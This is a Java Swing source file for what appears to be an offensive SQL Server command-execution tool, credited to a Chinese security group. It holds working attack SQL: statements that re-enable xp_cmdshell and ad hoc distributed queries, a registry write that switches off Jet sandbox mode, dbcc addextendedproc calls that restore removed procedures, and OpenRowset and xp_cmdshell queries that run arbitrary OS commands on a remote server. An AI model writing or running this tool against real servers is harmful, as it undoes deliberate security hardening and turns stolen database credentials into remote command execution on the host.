
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;


public class cmdwindows extends JFrame {
    private JButton runbutton;
    private JLabel jLabel4;
    private JButton rebutton;
    private JLabel jLabel2;
    private JComboBox jComboBox2;
    private JLabel jLabel3;
    private JTextArea areatext;
    private JScrollPane jScrollPane1;
    private JButton openbutton;
    private JComboBox jComboBox1;
    private JTextField cmdtext;
    private JLabel jLabel1;


    ResultSet rs;
    public cmdwindows(final String ipaddrtext,final String port,final String username,final String password,final String date){

        if(port==null){
            new login();
            return;
        }

        this.setDefaultCloseOperation(2);
        this.setLayout(null);
        setLocationRelativeTo(null);

        final TableModel jTable1Model = new DefaultTableModel(
                new String[][] { },
                new String[] { "结果" });
//jTable1.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        {
            runbutton = new JButton();
            getContentPane().add(runbutton);
            runbutton.setText("运行");
            runbutton.setBounds(403, 43, 60, 22);
            runbutton.setBackground(new java.awt.Color(192,192,192));
            runbutton.addActionListener(
                    new ActionListener() {
                        public void actionPerformed(ActionEvent e) {
                            String cmd=cmdtext.getText().trim();
                            String cmd1="\"cmd\"";
                            String fangshi=(String)jComboBox2.getSelectedItem();
                            String sql0="select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\winnt\\system32\\ias\\ias.mdb','select shell("+cmd1+")');";
                            String sql1="create table axeinfo(output varchar(1000));insert axeinfo exec master..xp_cmdshell '"+cmd+"';select * from axeinfo where output!='';drop table axeinfo;";
                            String sql2="select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\\windows\\system32\\ias\\ias.mdb','select shell("+cmd1+")');";

                            if(fangshi.equals("xp_cmdshell")){
                                areatext.setText("");
                                rs=axecon(ipaddrtext,port,username,password,date,sql1);
                                if(rs==null){

                                    areatext.setText("SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全"+"\n"+"配置的一部分而被关闭。"+"\n"+
                                            "系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。"+"\n");

                                }
                                try {
                                    while(rs.next()){

                                        String outlook=rs.getString("output");
                                        areatext.append(outlook+"\n");

                                    }
                                } catch (SQLException e1) {
                                    // TODO Auto-generated catch block
                                    e1.printStackTrace();

                                }

                            }
                            if(fangshi.equals("openrowset")){
                                areatext.setText("");
                                rs=axecon(ipaddrtext,port,username,password,date,sql2);
                                if(rs==null){
                                    rs=axecon(ipaddrtext,port,username,password,date,sql0);
                                    if(rs==null){
                                        areatext.setText("SQL Server 阻止了对组件 'openrowset' 的 过程'sys.openrowset' 的访问，"+"\n"+"因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'openrowset'。");
                                    }


                                }
                                try {
                                    while(rs.next()){

                                        String outlook=rs.getString("Expr1000");
                                        System.out.println(outlook);


                                        areatext.append("Expr1000"+"\n"+outlook+"\n");

                                    }
                                } catch (SQLException e1) {
                                    // TODO Auto-generated catch block
                                    e1.printStackTrace();
                                }

                            }
                        }
                    }
            );



        }
        {
            jLabel1 = new JLabel();
            getContentPane().add(jLabel1);
            jLabel1.setText("CMD\u547d\u4ee4");
            jLabel1.setBounds(8, 47, 55, 15);
        }
        {
            cmdtext = new JTextField();
            getContentPane().add(cmdtext);
            cmdtext.setBounds(61, 43, 165, 22);
        }
        {
            ComboBoxModel jComboBox1Model =
                    new DefaultComboBoxModel(
                            new String[] { "xp_cmdshell", "openrowset" });
            jComboBox1 = new JComboBox();
            getContentPane().add(jComboBox1);
            jComboBox1.setModel(jComboBox1Model);
            jComboBox1.setBounds(61, 16, 99, 22);
            jComboBox1.setBackground(new java.awt.Color(192,192,192));
        }
        {
            openbutton = new JButton();
            getContentPane().add(openbutton);
            openbutton.setText("\u5f00\u542f");
            openbutton.setBounds(166, 16, 60, 22);
            openbutton.setBackground(new java.awt.Color(192,192,192));
            openbutton.addActionListener(
                    new ActionListener() {
                        public void actionPerformed(ActionEvent e) {
                            String reobject=(String) jComboBox1.getSelectedItem();
                            String sql1="exec sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; ";
                            String sql2="exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
                            String sql3="exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',1";
                            int FF=0;

                            if(reobject.equals("xp_cmdshell")){
                                exec(ipaddrtext,port,username,password,date,sql1);
                                JOptionPane.showMessageDialog(null, "开启成功!");

                            }
                            if(reobject.equals("openrowset")){
                                exec(ipaddrtext,port,username,password,date,sql2);
                                exec(ipaddrtext,port,username,password,date,sql3);
                                JOptionPane.showMessageDialog(null, "开启成功!");


                            }



                        }
                    }
            );

        }
        {
            jScrollPane1 = new JScrollPane();
            getContentPane().add(jScrollPane1);
            jScrollPane1.setBounds(0, 85, 474, 329);
            {
                areatext = new JTextArea();
                jScrollPane1.setViewportView(areatext);
                areatext.setText("注意:openrowset为沙盒模式,使用沙盒模式执行cmd命令时是没有看到返回结果的，"+"\n"+"如果返回一些数字说明执行成功，否则失败，");
            }
        }
        {
            jLabel3 = new JLabel();
            getContentPane().add(jLabel3);
            jLabel3.setText("\u8fd0\u884c\u65b9\u5f0f");
            jLabel3.setBounds(238, 45, 66, 18);
        }
        {
            ComboBoxModel jComboBox2Model =
                    new DefaultComboBoxModel(
                            new String[] { "xp_cmdshell", "openrowset" });
            jComboBox2 = new JComboBox();
            getContentPane().add(jComboBox2);
            jComboBox2.setModel(jComboBox2Model);
            jComboBox2.setBounds(298, 43, 99, 22);
            jComboBox2.setBackground(new java.awt.Color(192,192,192));
        }
        {
            jLabel2 = new JLabel();
            getContentPane().add(jLabel2);
            jLabel2.setText("SQL\u7ec4\u4ef6");
            jLabel2.setBounds(8, 20, 62, 15);
        }
        {
            rebutton = new JButton();
            getContentPane().add(rebutton);
            rebutton.setText("恢复");
            rebutton.setBounds(232, 16, 60, 22);
            rebutton.setBackground(new java.awt.Color(192,192,192));
            rebutton.addActionListener(
                    new ActionListener() {
                        public void actionPerformed(ActionEvent e) {
                            String reobject=(String) jComboBox1.getSelectedItem();
                            String sql1="dbcc addextendedproc("+"\"sp_oacreate\""+","+"\"odsole70.dll\""+");";
                            String sql2="dbcc addextendedproc("+"\"xp_cmdshell\""+","+"\"xplog70.dll\""+");";

                            System.out.println(sql1);
                            System.out.println(sql2);

                            if(reobject.equals("xp_cmdshell")){
                                rs=(ResultSet) exec(ipaddrtext,port,username,password,date,sql2);
                                if(rs==null){JOptionPane.showMessageDialog(null, "恢复失败!");return;}
                                JOptionPane.showMessageDialog(null, "恢复成功!");

                            }
                            if(reobject.equals("openrowset")){
                                rs=(ResultSet) exec(ipaddrtext,port,username,password,date,sql1);
                                if(rs==null){JOptionPane.showMessageDialog(null, "恢复失败!");return;}
                                JOptionPane.showMessageDialog(null, "恢复成功!");


                            }



                        }
                    }
            );
        }
        {
            jLabel4 = new JLabel();
            getContentPane().add(jLabel4);
            jLabel4.setText("中国调用门网络安全小组");
            jLabel4.setBounds(304, 20, 159, 15);
        }

        this.setSize(482, 447);
        this.setVisible(true);
        getContentPane().setBackground(new java.awt.Color(247,247,247));
        this.setTitle("CMD\u547d\u4ee4");
    }
    private void setLayout(JButton button1, String south) {


    }





    public   Object exec(final String ipaddrtext,final String port,final String username,final String password,final String date,String sql){
        Statement stmt = null;
        Object rs=null;
        String url="jdbc:sqlserver://"+ipaddrtext+":"+port+";DatabaseName="+date+"";
        try{

            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");

            Connection con=DriverManager.getConnection(url,username,password);
            stmt = con.createStatement();
        }catch(Exception e2){

            e2.printStackTrace();
        }

        try {
            rs = stmt.executeUpdate(sql);
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return rs;
    }
    public   ResultSet axecon(final String ipaddrtext,final String port,final String username,final String password,final String date,String sql){
        Statement stmt = null;
        ResultSet rs=null;
        String url="jdbc:sqlserver://"+ipaddrtext+":"+port+";DatabaseName="+date+"";


        try{


            Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");

            Connection con=DriverManager.getConnection(url,username,password);
            stmt = con.createStatement();
        }catch(Exception e2){
            //	 textArea.setText("数据库连接失败");
            e2.printStackTrace();
        }

        try {
            rs = stmt.executeQuery(sql);
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return rs;
    }

    public static void main(String[] args){

        final String date = null;
        final String ipaddrtext = null;
        final String username = null;
        final String password = null;
        final String port = null;




        new cmdwindows(ipaddrtext,port,username,password,date);


    }

}
